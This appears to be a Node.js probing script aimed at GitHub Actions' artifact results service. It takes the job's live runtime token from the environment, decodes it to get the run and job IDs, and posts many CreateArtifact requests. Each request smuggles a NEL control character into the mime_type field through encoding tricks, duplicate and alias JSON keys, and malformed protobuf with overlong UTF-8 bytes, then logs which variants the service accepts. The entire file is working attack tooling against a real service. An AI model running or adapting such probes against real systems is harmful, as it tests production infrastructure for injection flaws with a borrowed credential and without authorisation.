module.exports = async function scan() {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const url = `${new URL(resultsUrl).origin}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact`;
  const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
  const weird = 'application/json\u0085';
  const safe = 'application/json';
  const candidates = [
    ['literal-nel', JSON.stringify({...ids, name: 'vs-literal-nel', version: 7, mime_type: weird})],
    ['unicode-escape', JSON.stringify({...ids, name: 'vs-unicode-escape', version: 7, mime_type: weird}).replace('\\u0085', '\\u0085')],
    ['percent-encoded', JSON.stringify({...ids, name: 'vs-percent-encoded', version: 7, mime_type: 'application/json%C2%85'})],
    ['html-entity', JSON.stringify({...ids, name: 'vs-html-entity', version: 7, mime_type: 'application/json&#133;'})],
    ['quoted-whole', JSON.stringify({...ids, name: 'vs-quoted-whole', version: 7, mime_type: `"${weird}"`})],
    ['alias-safe-then-bad', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-alias-a","version":7,"mime_type":"${safe}","mimeType":"${weird}"}`],
    ['alias-bad-then-safe', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-alias-b","version":7,"mime_type":"${weird}","mimeType":"${safe}"}`],
    ['duplicate-safe-then-bad', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-dupe-a","version":7,"mime_type":"${safe}","mime_type":"${weird}"}`],
    ['duplicate-bad-then-safe', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-dupe-b","version":7,"mime_type":"${weird}","mime_type":"${safe}"}`],
  ];
  for (const [label, body] of candidates) {
    const response = await fetch(url, {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'}, body});
    const result = await response.json().catch(() => ({}));
    console.log(`${label}: HTTP ${response.status}; ${result.msg || ''}; accepted=${Boolean(result.ok)}`);
  }

  function varint(value) {
    const out = [];
    while (value >= 128) { out.push((value & 127) | 128); value = Math.floor(value / 128); }
    out.push(value);
    return Buffer.from(out);
  }
  function field(number, data) {
    const bytes = Buffer.isBuffer(data) ? data : Buffer.from(data);
    return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
  }
  function proto(name, mimeBuffers) {
    const pieces = [field(1, runId), field(2, jobId), field(3, name), Buffer.from([0x28, 0x07])];
    for (const mime of mimeBuffers) pieces.push(field(6, field(1, mime)));
    return Buffer.concat(pieces);
  }
  const binary = [
    ['binary-safe', proto('vs-bin-safe', [Buffer.from(safe)])],
    ['binary-nel', proto('vs-bin-nel', [Buffer.from(weird)])],
    ['binary-latin1-nel', proto('vs-bin-latin1-nel', [Buffer.from([...Buffer.from(safe), 0x85])])],
    ['binary-overlong-nel', proto('vs-bin-overlong-nel', [Buffer.from([...Buffer.from(safe), 0xc0, 0x85])])],
    ['binary-safe-then-nel', proto('vs-bin-dupe-a', [Buffer.from(safe), Buffer.from(weird)])],
    ['binary-nel-then-safe', proto('vs-bin-dupe-b', [Buffer.from(weird), Buffer.from(safe)])],
  ];
  for (const [label, body] of binary) {
    const response = await fetch(url, {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/protobuf'}, body});
    const result = await response.arrayBuffer();
    console.log(`${label}: HTTP ${response.status}; type=${response.headers.get('content-type')}; bytes=${result.byteLength}`);
  }
};
